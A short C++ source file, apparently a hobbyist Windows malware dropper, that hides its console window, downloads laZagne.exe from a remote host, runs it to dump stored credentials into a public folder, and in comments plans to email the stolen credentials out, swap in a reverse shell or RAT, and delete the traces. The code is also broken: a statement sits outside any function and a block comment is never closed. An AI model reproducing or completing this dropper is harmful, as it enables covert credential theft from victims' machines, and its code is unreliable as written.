//m-s3c
//16/06/2020
//Compiled on visual studio 2013 visual c++ compiler
//Tested on windows 10

#include 				<windows.h>
#include 				<iostream.h>
#include				<iostream>
#include				<Windows.h>
#include				<string>
#include				<fstream>
#pragma comment(lib, "urlmon.lib")


using namespace std;
//This will give us Temp Directory of particular machine so we can save our PE there
char const *folder = getenv("TMPDIR");
if (folder == 0)
    folder = "/tmp";

//This fuction will give us stelth window so the user will see nothing during the execution of our PE
void Stealth()
{
 HWND Stealth;
 AllocConsole();
 Stealth = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(Stealth,0);
}

//This is main fuction
int main()
{	
	//Here we download The PE
	Stealth();
	string dwnld_URL = "http://10.1.19.2/Desktop/laZagne.exe";
	string savepath = "C:\\Users\\Public\\laZagne.exe";
	URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);

	//Hiding the Exection by using Stealth Fuction
	Stealth(); //Here we call the fuction and then Execute the system() to trigger the Malware
	//Running lazagne, But it can be Reverse Shell as well, RAT.
	system("C:\\Users\\Public\\laZagne.exe > C:\\Users\\Public\\out.txt");
  /* Soon i'll make the Send mail capability to this project so the PE can send out.txt
	return EXIT_SUCCESS;
	//Here you can make implementation of another python script to send email or libcurl
	//
	//System(""C:\\Users\\Public\\send_credential.exe")
	//The you can cover tracks by deleting the dumped credentials and all the PEs
	
	return 0;
}
